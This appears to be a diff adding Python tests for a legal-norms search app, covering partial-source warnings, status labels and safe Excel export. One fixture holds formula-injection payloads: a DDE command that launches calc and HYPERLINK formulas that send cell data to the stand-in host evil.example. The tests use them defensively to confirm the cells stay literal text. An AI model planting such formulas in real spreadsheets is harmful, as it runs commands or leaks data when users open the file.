@@ -870,6 +870,154 @@ class TestAvisoPorFonte:
         assert "vem só da web aberta" not in avisos
         assert "A web aberta também não entregou resultado." in avisos
 
+    def test_lexml_morto_tcu_saudavel_nao_diz_nenhuma_fonte_catalogada(self):
+        # Revisao final, N1 (bloqueador): o aviso "Nenhuma fonte catalogada entregou"
+        # saia com o card do TCU na tela, porque nao conferia que TODAS morreram.
+        from models import KeywordStatus as KS
+        diag = [KS(keyword="k", source="lexml", status="error", motivo="bloqueio_waf", detalhe="d"),
+                KS(keyword="k", source="tcu", status="ok", result_count=1)]
+        avisos = " ".join(w.value for w in _apptest_passo4(diag, [_make_result(source="tcu")]).warning)
+        assert "Nenhuma fonte catalogada" not in avisos
+        assert "Cobertura incompleta" in avisos and "lexml indisponível (bloqueio_waf)" in avisos
+        assert "tcu indisponível" not in avisos and "tcu respondeu" not in avisos   # so a morta e listada
+
+
+# ---------------------------------------------------------------------------
+# Revisao final da frente 2 (trilha FIX-SAIDA): o que a planilha e a tela
+# afirmavam de falso. O id do achado (final-triagem.md) vai no nome da classe.
+# ---------------------------------------------------------------------------
+
+# Campos de texto da aba Normativos, cada um com uma formula de verdade (repro
+# do security-auditor: DDE e exfiltracao por HYPERLINK ao abrir o .xlsx).
+_FORMULAS = {
+    "nome": '=cmd|"/c calc"!A0',
+    "ementa": '=HYPERLINK("http://evil.example/"&A1,"clique")',
+    "tipo": "=1+1", "numero": "=2+2", "data": "=TODAY()", "orgao_emissor": "=A1",
+    "link": '=HYPERLINK("http://evil.example")', "categoria": "=B2", "situacao": "=C3",
+}
+
+
+class TestSecFormulaNaAbaNormativos:
+    """S-SEC (critico): nenhuma celula da aba Normativos vira formula; o texto fica LITERAL."""
+
+    def _planilha(self):
+        return generate_excel([_make_result(**_FORMULAS)], "t")
+
+    def test_reload_da_tipo_string_e_valor_identico(self):
+        ws = _load_workbook_from_buffer(self._planilha()).active
+        campos = [campo for _, _, campo in COLUMNS]
+        for campo, texto in _FORMULAS.items():
+            c = ws.cell(row=3, column=campos.index(campo) + 1)
+            assert c.data_type == "s", (campo, c.data_type)
+            assert c.value == texto, campo                     # sem apostrofo, sem troca de caractere
+
+    def test_xml_salvo_nao_tem_elemento_formula(self):
+        import zipfile
+        with zipfile.ZipFile(self._planilha()) as z:
+            xml = z.read("xl/worksheets/sheet1.xml").decode("utf-8")
+            nomes = z.namelist()
+            compartilhadas = z.read("xl/sharedStrings.xml").decode("utf-8") if "xl/sharedStrings.xml" in nomes else ""
+        assert "<f>" not in xml and "<f " not in xml
+        assert "=cmd|" in (xml + compartilhadas).replace("&quot;", '"')   # gravado como texto
+
+
+class TestN8KeywordLiteralNoDiagnostico:
+    """S-N8: a palavra-chave e a fonte vao LITERAIS para a aba de diagnostico."""
+
+    def test_keyword_com_cara_de_segredo_nao_e_redigida(self):
+        diag = [_KS(keyword="token=abc", source="lexml", status="empty")]
+        ws = _load_workbook_from_buffer(generate_excel([], "t", diagnostico=diag))[DIAGNOSTICO_SHEET]
+        assert ws.cell(row=3, column=2).value == "token=abc"
+
+    def test_keyword_e_fonte_com_formula_ficam_texto_literal(self):
+        diag = [_KS(keyword="=1+1", source="=cmd", status="empty")]
+        ws = _load_workbook_from_buffer(generate_excel([], "t", diagnostico=diag))[DIAGNOSTICO_SHEET]
+        for col, texto in ((1, "=cmd"), (2, "=1+1")):
+            c = ws.cell(row=3, column=col)
+            assert (c.value, c.data_type) == (texto, "s")
+
+    def test_keyword_com_caractere_de_controle_nao_derruba_a_exportacao(self):
+        diag = [_KS(keyword="a\x07b", source="lexml", status="empty")]
+        ws = _load_workbook_from_buffer(generate_excel([], "t", diagnostico=diag))[DIAGNOSTICO_SHEET]
+        assert ws.cell(row=3, column=2).value == "ab"          # openpyxl recusa o char; o resto fica
+
+
+class TestUX1ParcialNaoEIndisponivel:
+    """S-UX1+N3: error+parcial (TCU: um endpoint caiu, o outro respondeu) e 'Parcial'."""
+
+    def test_rotulo_parcial(self):
+        s = _KS(keyword="k", source="tcu", status="error", motivo="http_5xx", result_count=3, parcial=True)
+        assert rotulo_status(s) == "Parcial"
+
+    def test_planilha_rotula_parcial(self):
+        diag = [_KS(keyword="k", source="tcu", status="error", motivo="http_5xx", result_count=3, parcial=True)]
+        ws = _load_workbook_from_buffer(generate_excel([], "t", diagnostico=diag))[DIAGNOSTICO_SHEET]
+        assert ws.cell(row=3, column=3).value == "Parcial"
+
+    def test_tela_secao_e_metrica_proprias(self):
+        diag = [_KS(keyword="k", source="tcu", status="error", motivo="http_5xx", result_count=3, parcial=True,
+                    detalhe="Acórdãos: ok (500 itens); Atos: http_5xx em HTTP 500")]
+        at = _apptest_passo4(diag, [_make_result(source="tcu")])
+        md = " ".join(m.value for m in at.markdown)
+        assert "Fontes indisponíveis" not in md and "Fontes parciais" in md
+        metricas = {m.label: m.value for m in at.metric}
+        assert metricas["Indisponíveis"] == "0" and metricas["Parciais"] == "1"
+        assert any("1 parciais" in e.label for e in at.expander)
+
+    def test_parcial_sem_match_avisa_e_nao_diz_com_sucesso(self):
+        # N3: paginacao interrompida (empty+parcial) e endpoint caido (error+parcial), 0 resultado
+        diag = [_KS(keyword="a", source="tcu", status="empty", parcial=True, detalhe="pagina 2: http_5xx"),
+                _KS(keyword="b", source="tcu", status="error", motivo="http_5xx", parcial=True, detalhe="Atos: 500")]
+        at = _apptest_passo4(diag)
+        assert not any("Tente ampliar" in i.value for i in at.info)
+        assert not any("não puderam consultar a fonte" in e.value for e in at.error)
+        avisos = " ".join(w.value for w in at.warning)
+        assert "coleta parcial" in avisos and "tcu respondeu parcialmente" in avisos
+        assert not any("com sucesso" in c.value for c in at.caption)
+
+    def test_empty_sem_parcial_continua_com_sucesso(self):
+        at = _apptest_passo4([_KS(keyword="a", source="tcu", status="empty")])
+        assert any("com sucesso" in c.value for c in at.caption)
+        assert any("Tente ampliar" in i.value for i in at.info)
+
+
+def _apptest_passo3(kw_statuses, results=()):
+    """Como _apptest_passo4, mas no Passo 3 com a busca ja feita (o resumo verde/amarelo/vermelho)."""
+    from streamlit.testing.v1 import AppTest
+    at = AppTest.from_file("app.py", default_timeout=30)
+    at.session_state["wizard_step"] = 3
+    at.session_state["search_done"] = True
+    at.session_state["results"] = list(results)
+    at.session_state["keyword_statuses"] = list(kw_statuses)
+    at.run()
+    assert not at.exception, at.exception
+    return at
+
+
+class TestN9Passo3NaoDizConcluidaVerde:
+    """S-N9: 'Busca concluida' verde com todas as fontes indisponiveis era falso."""
+
+    def test_tudo_indisponivel_nao_e_verde(self):
+        diag = [_KS(keyword="k", source="lexml", status="error", motivo="bloqueio_waf"),
+                _KS(keyword="k", source="tcu", status="error", motivo="http_5xx")]
+        at = _apptest_passo3(diag)
+        assert not at.success
+        assert any("indisponíveis" in e.value for e in at.error)
+
+    def test_busca_saudavel_continua_verde(self):
+        at = _apptest_passo3([_KS(keyword="k", source="tcu", status="ok", result_count=1)], [_make_result()])
+        assert any("Busca concluida - 1 normativos" in s.value for s in at.success)
+
+    def test_resumo_da_busca_do_status_de_progresso(self):
+        from app import _resumo_da_busca
+        todas = [_KS(keyword="k", source="lexml", status="error", motivo="timeout"),
+                 _KS(keyword="j", source="lexml", status="error", motivo="nao_consultada")]
+        assert _resumo_da_busca(0, todas)[0] == "error"
+        mista = todas + [_KS(keyword="k", source="tcu", status="ok", result_count=2)]
+        assert _resumo_da_busca(2, mista)[0] == "warning"
+        assert _resumo_da_busca(2, [_KS(keyword="k", source="tcu", status="ok", result_count=2)]) == \
+            ("success", "Busca concluida - 2 normativos encontrados")
+
 
 # ===========================================================================
 #  Run via pytest or direct execution
